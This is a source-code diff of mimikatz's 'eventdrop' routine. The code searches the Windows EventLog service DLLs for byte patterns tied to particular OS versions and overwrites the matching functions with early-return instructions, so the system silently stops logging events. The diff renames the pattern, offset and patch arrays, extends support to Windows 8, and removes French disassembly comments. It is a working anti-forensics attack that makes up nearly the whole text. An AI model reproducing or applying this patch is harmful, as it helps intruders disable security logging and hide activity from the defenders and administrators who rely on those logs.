@@ -89,149 +89,81 @@ bool mod_mimikatz_divers::noroutemon(vector<wstring> * arguments)
 
 bool mod_mimikatz_divers::eventdrop(vector<wstring> * arguments)
 {
+	wchar_t LIBNAME_WNT5_EVTLOG[] = L"eventlog.dll";
+	wchar_t LIBNAME_WNT6_EVTLOG[] = L"wevtsvc.dll";
 #ifdef _M_X64
-	/* Windows NT 5 (XP / 2003) x64
-	PerformWriteRequest(x)
-	{
-	.text:000007FF7C1919C0                 mov     r11, rsp						<= vrai départ de la fonction
-	.text:000007FF7C1919C3                 sub     rsp, 178h
-	=>	.text:000007FF7C1919CA                 mov     [r11+10h], rbx	49 89 5b 10
-	.text:000007FF7C1919CE                 mov     [r11+18h], rsi	49 89 73 18
-	<=>
-	.text:000007FF7C1919C0                 xor     r13d, r13d		45 33 ed	<= vrai départ de la fonction
-	.text:000007FF7C1919C3                 retn						c3			<= puis fin
-	} */
-	BYTE patternCommeCa5[]		= {0x49, 0x89, 0x5b, 0x10, 0x49, 0x89, 0x73, 0x18};	// 49 89 5b 10 49 89 73 18
-	BYTE patternPasCommeCa5[]	= {0x45, 0x33, 0xed, 0xc3};
-	long offsetCibleCommeCa5	= -10;
+	BYTE PTRN_WNT5_PerformWriteRequest[]			= {0x49, 0x89, 0x5b, 0x10, 0x49, 0x89, 0x73, 0x18};
+	LONG OFFS_WNT5_PerformWriteRequest				= -10;
+	BYTE PATC_WNT5_PerformWriteRequest[]			= {0x45, 0x33, 0xed, 0xc3};
 
-	/* Windows NT 6.0 (Vista / 2008) x64
-	private: void Channel::ActualProcessEvent(class BinXmlReader &)
-	{
-	.text:000007FF79ED8904                 mov     [rsp+arg_0], rbx											<= vrai départ de la fonction
-	.text:000007FF79ED8909                 push    rdi
-	.text:000007FF79ED890A                 sub     rsp, 20h
-	=>	.text:000007FF79ED890E                 mov     rdi, rcx									48 8b f9
-	.text:000007FF79ED8911                 mov     rcx, rdx									48 8b ca
-	.text:000007FF79ED8914                 mov     rbx, rdx									48 8b da
-	.text:000007FF79ED8917                 call    ?Reset@BinXmlReader@@QEAAXXZ				e8 xx xx xx xx
-	<=>
-	.text:000007FF79ED8904                 retn												c3				<= vrai départ de la fonction (et fin)
-	}
-	*/
-	BYTE patternCommeCa60[]		= {0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0x48, 0x8b, 0xda, 0xe8};	// 48 8b f9 48 8b ca 48 8b da e8
-	BYTE patternPasCommeCa60[]	= {0xc3};
-	long offsetCibleCommeCa60	= -10;
+	BYTE PTRN_WN60_Channel__ActualProcessEvent[]	= {0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0x48, 0x8b, 0xda, 0xe8};
+	LONG OFFS_WN60_Channel__ActualProcessEvent		= 0;
+	BYTE PATC_WN62_Channel__ActualProcessEvent[]	= {0xff, 0xf7, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};
+	LONG OFFS_WN62_Channel__ActualProcessEvent		= 0;
 
-	/* Windows NT 6.1 (Seven / 2008r2) x64
-	private: void Channel::ActualProcessEvent(class BinXmlReader &)
-	{
-	.text:000007FF7C401B9C                 push    rdi														<= vrai départ de la fonction
-	.text:000007FF7C401B9E                 sub     rsp, 50h
-	.text:000007FF7C401BA2                 mov     [rsp+58h+var_38], 0FFFFFFFFFFFFFFFEh
-	.text:000007FF7C401BAB                 mov     [rsp+58h+arg_0], rbx
-	=>	.text:000007FF7C401BB0                 mov     rbx, rdx									48 8b da
-	.text:000007FF7C401BB3                 mov     rdi, rcx									48 8b f9
-	.text:000007FF7C401BB6                 mov     rcx, rdx									48 8b ca
-	.text:000007FF7C401BB9                 call    ?Reset@BinXmlReader@@QEAAXXZ				e8 xx xx xx xx
-	<=>
-	.text:000007FF7C401B9C                 retn												c3				<= vrai départ de la fonction (et fin)
-	} */
-	BYTE patternCommeCa61[]		= {0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};	// 48 8b da 48 8b f9 48 8b ca e8
-	BYTE patternPasCommeCa61[]	= {0xc3};
-	long offsetCibleCommeCa61	= -20; // risqué :( a tester !!! //
+	BYTE PATC_WNT6_Channel__ActualProcessEvent[]	= {0xc3};
 #elif defined _M_IX86
-	/* Windows NT 5 (XP / 2003) x86
-	__stdcall PerformWriteRequest(x)
-	{
-	.text:77B827F9                 push    0D4h									<= vrai départ de la fonction
-	.text:77B827FE                 push    offset stru_xxxxxxxx
-	.text:77B82803                 call    __SEH_prolog
-	.text:77B82808                 mov     eax, ___security_cookie
-	=>	.text:77B8280D                 mov     [ebp+var_1C], eax		89 45 e4
-	.text:77B82810                 mov     edi, [ebp+arg_0]			8b 7d 08
-	.text:77B82813                 mov     [ebp+var_50], edi		89 7d (b0/b4)
-	<=>
-	.text:77B827F9                 xor     eax, eax					33 c0		<= vrai départ de la fonction
-	.text:77B827FB                 retn    4						c2 04 00	<= puis fin
-	} */
-	BYTE patternCommeCa5[]		= {0x89, 0x45, 0xe4, 0x8b, 0x7d, 0x08, 0x89, 0x7d};	// 89 45 e4 8b 7d 08 89 7d
-	BYTE patternPasCommeCa5[]	= {0x33, 0xc0, 0xc2, 0x04, 0x00};
-	long offsetCibleCommeCa5	= -20; // risqué :(
+	BYTE PTRN_WNT5_PerformWriteRequest[]			= {0x89, 0x45, 0xe4, 0x8b, 0x7d, 0x08, 0x89, 0x7d};
+	LONG OFFS_WNT5_PerformWriteRequest				= -20;
+	BYTE PATC_WNT5_PerformWriteRequest[]			= {0x33, 0xc0, 0xc2, 0x04, 0x00};
+		
+	BYTE PTRN_WN60_Channel__ActualProcessEvent[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x56, 0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};
+	LONG OFFS_WN60_Channel__ActualProcessEvent		= 0;
+	BYTE PATC_WN61_Channel__ActualProcessEvent[]	= {0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};
+	LONG OFFS_WN61_Channel__ActualProcessEvent		= -(5 + 5 + 2);
+	BYTE PATC_WN62_Channel__ActualProcessEvent[]	= {0x33, 0xc4, 0x50, 0x8d, 0x44, 0x24, 0x28, 0x64, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x75, 0x0c};
+	LONG OFFS_WN62_Channel__ActualProcessEvent		= -(5 + 1 + 1 + 1 + 3 + 1 + 6 + 5 + 2 + 3 + 2 + 1 + 2);
 
-	/* Windows NT 6.0 (Vista / 2008) x86
-	private: void __thiscall Channel::ActualProcessEvent(class BinXmlReader &)
-	{
-	.text:71505B19                 mov     edi, edi													<= vrai départ de la fonction
-	.text:71505B1B                 push    ebp
-	=>	.text:71505B1C                 mov     ebp, esp									8b ec
-	.text:71505B1E                 push    esi										56
-	.text:71505B1F                 mov     esi, ecx									8b f1
-	.text:71505B21                 mov     ecx, [ebp+arg_0]							8b 4d 08
-	.text:71505B24                 call    ?Reset@BinXmlReader@@QAEXXZ				e8 xx xx xx xx
-	<=>
-	.text:71505B19                 retn												c3				<= vrai départ de la fonction (et fin)
-	} */
-	BYTE patternCommeCa60[]		= {0x8b, 0xec, 0x56, 0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};	// 8b ec 56 8b f1 8b 4d 08 e8
-	BYTE patternPasCommeCa60[]	= {0xc2, 0x04, 0x00};
-	long offsetCibleCommeCa60	= -3;
-
-	/* Windows NT 6.1 (Seven) x86
-	private: void __thiscall Channel::ActualProcessEvent(class BinXmlReader &)
-	{
-	.text:715D2811                 push    10h														<= vrai départ de la fonction
-	.text:715D2813                 mov     eax, offset loc_716AC264
-	.text:715D2818                 call    sub_715D1774
-	.text:715D281D                 mov     esi, ecx
-	.text:715D281F                 mov     ecx, [ebp+8]
-	.text:715D2822                 call    ?Reset@BinXmlReader@@QAEXXZ
-	.text:715D2827                 xor     ecx, ecx
-	=>	.text:715D2829                 cmp     [esi+0C0h], cl							xx xx xx xx 00 00
-	.text:715D282F                 jz      short loc_715D283D						74 0c
-	.text:715D2831                 cmp     [esi+0DCh], ecx							39 xx xx xx xx xx
-	<=>
-	.text:715D2811                 retn												c3				<= vrai départ de la fonction (et fin)
-	} */
-	BYTE patternCommeCa61[]		= {0x00, 0x00, 0x74, 0x0c, 0x39};	// 00 00 74 0c 39
-	BYTE patternPasCommeCa61[]	= {0xc2, 0x04, 0x00};
-	long offsetCibleCommeCa61	= -24; // risqué++ :(:(
+	BYTE PATC_WNO8_Channel__ActualProcessEvent[]	= {0xc2, 0x04, 0x00};
+	BYTE PATC_WIN8_Channel__ActualProcessEvent[]	= {0xc2, 0x08, 0x00};
 #endif
 
-	BYTE * patternCommeCa = NULL; DWORD szPatternCommeCa = 0;
-	BYTE * patternPasCommeCa = NULL; DWORD szPatternPasCommeCa = 0;
-	long offsetPatternPasCommeCa = 0;
-
+	BYTE * PTRN_Process = NULL; DWORD SIZE_PTRN_Process = 0;
+	BYTE * PATC_Process = NULL; DWORD SIZE_PATC_Process = 0;
+	LONG OFFS_PATC_Process = 0;
 	wstring libEvent;
 
-	if(mod_system::GLOB_Version.dwMajorVersion == 5)
+	if(mod_system::GLOB_Version.dwMajorVersion < 6)
 	{
-		libEvent.assign(L"eventlog.dll");
-		patternCommeCa = patternCommeCa5; szPatternCommeCa = sizeof(patternCommeCa5); 
-		patternPasCommeCa = patternPasCommeCa5; szPatternPasCommeCa = sizeof(patternPasCommeCa5);
-		offsetPatternPasCommeCa = offsetCibleCommeCa5;
+		libEvent.assign(LIBNAME_WNT5_EVTLOG);
+		PTRN_Process = PTRN_WNT5_PerformWriteRequest; SIZE_PTRN_Process = sizeof(PTRN_WNT5_PerformWriteRequest);
+		PATC_Process = PATC_WNT5_PerformWriteRequest; SIZE_PATC_Process = sizeof(PATC_WNT5_PerformWriteRequest);
+		OFFS_PATC_Process = OFFS_WNT5_PerformWriteRequest;
 	}
-	else if(mod_system::GLOB_Version.dwMajorVersion == 6)
+	else 
 	{
-		libEvent.assign(L"wevtsvc.dll");
-		if(mod_system::GLOB_Version.dwMinorVersion == 0)
+		libEvent.assign(LIBNAME_WNT6_EVTLOG);
+		if(mod_system::GLOB_Version.dwMinorVersion < 1)
 		{
-			patternCommeCa = patternCommeCa60; szPatternCommeCa = sizeof(patternCommeCa60);
-			patternPasCommeCa = patternPasCommeCa60; szPatternPasCommeCa = sizeof(patternPasCommeCa60);
-			offsetPatternPasCommeCa = offsetCibleCommeCa60;
+			PTRN_Process = PTRN_WN60_Channel__ActualProcessEvent; SIZE_PTRN_Process = sizeof(PTRN_WN60_Channel__ActualProcessEvent);
+			OFFS_PATC_Process = OFFS_WN60_Channel__ActualProcessEvent;
+#ifdef _M_X64
 		}
-		else if(mod_system::GLOB_Version.dwMinorVersion == 1)
+#elif defined _M_IX86
+			PATC_Process = PATC_WNO8_Channel__ActualProcessEvent; SIZE_PATC_Process = sizeof(PATC_WNO8_Channel__ActualProcessEvent);
+		}
+		else if(mod_system::GLOB_Version.dwMinorVersion < 2)
 		{
-			patternCommeCa = patternCommeCa61; szPatternCommeCa = sizeof(patternCommeCa61);
-			patternPasCommeCa = patternPasCommeCa61; szPatternPasCommeCa = sizeof(patternPasCommeCa61);
-			offsetPatternPasCommeCa = offsetCibleCommeCa61;
+			PTRN_Process = PATC_WN61_Channel__ActualProcessEvent; SIZE_PTRN_Process = sizeof(PATC_WN61_Channel__ActualProcessEvent);
+			OFFS_PATC_Process = OFFS_WN61_Channel__ActualProcessEvent;
+			PATC_Process = PATC_WNO8_Channel__ActualProcessEvent; SIZE_PATC_Process = sizeof(PATC_WNO8_Channel__ActualProcessEvent);
 		}
+#endif
+		else
+		{
+			PTRN_Process = PATC_WN62_Channel__ActualProcessEvent; SIZE_PTRN_Process = sizeof(PATC_WN62_Channel__ActualProcessEvent);
+			OFFS_PATC_Process = OFFS_WN62_Channel__ActualProcessEvent;
+#ifdef _M_IX86
+			PATC_Process = PATC_WIN8_Channel__ActualProcessEvent; SIZE_PATC_Process = sizeof(PATC_WIN8_Channel__ActualProcessEvent);
+#endif
+		}
+
+#ifdef _M_X64
+		PATC_Process = PATC_WNT6_Channel__ActualProcessEvent; SIZE_PATC_Process = sizeof(PATC_WNT6_Channel__ActualProcessEvent);
+#endif
 	}
 
-	if(patternCommeCa && patternPasCommeCa)
-	{
-		mod_patch::patchModuleOfService(L"EventLog", libEvent, patternCommeCa, szPatternCommeCa, patternPasCommeCa, szPatternPasCommeCa, offsetPatternPasCommeCa);
-	}
-	else wcout << L"Impossible de choisir les patterns pour la version " << mod_system::GLOB_Version.dwMajorVersion << L'.' << mod_system::GLOB_Version.dwMinorVersion << endl;
+	mod_patch::patchModuleOfService(L"EventLog", libEvent, PTRN_Process, SIZE_PTRN_Process, PATC_Process, SIZE_PATC_Process, OFFS_PATC_Process);
 
 	return true;
 }
